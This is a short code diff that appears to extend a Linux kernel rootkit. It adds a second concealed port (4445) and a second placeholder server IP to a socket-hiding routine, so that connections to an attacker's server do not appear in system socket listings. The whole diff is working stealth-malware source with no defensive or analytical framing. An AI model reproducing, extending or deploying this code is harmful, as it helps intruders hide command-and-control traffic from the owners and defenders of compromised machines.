@@ -4,13 +4,17 @@
 #include "../include/bpf_hook.h"
 
 #define HIDDEN_PORT 80
+#define HIDDEN_PORT2 4445
 
 static __be32 hidden_ip_cached = 0;
+static __be32 hidden_ip2_cached = 0;
 
 static inline void init_hidden_ip(void)
 {
     if (unlikely(hidden_ip_cached == 0))
         hidden_ip_cached = in_aton(YOUR_SRV_IP);
+    if (unlikely(hidden_ip2_cached == 0))
+        hidden_ip2_cached = in_aton(YOUR_SRV_IP2);
 }
 
 struct bpf_iter_ctx_tcp {
@@ -53,11 +57,17 @@ static notrace bool should_hide_socket_port(struct sock_common *sk)
                 return true;
             }
         }
+        if (sport == HIDDEN_PORT2 || ntohs(dport) == HIDDEN_PORT2) {
+            if (saddr == hidden_ip2_cached || daddr == hidden_ip2_cached ||
+                saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) {
+                return true;
+            }
+        }
     }
     else if (sk->skc_family == AF_INET6) {
         sport = sk->skc_num;
         
-        if (sport == HIDDEN_PORT) {
+        if (sport == HIDDEN_PORT || sport == HIDDEN_PORT2) {
             return true;
         }
     }
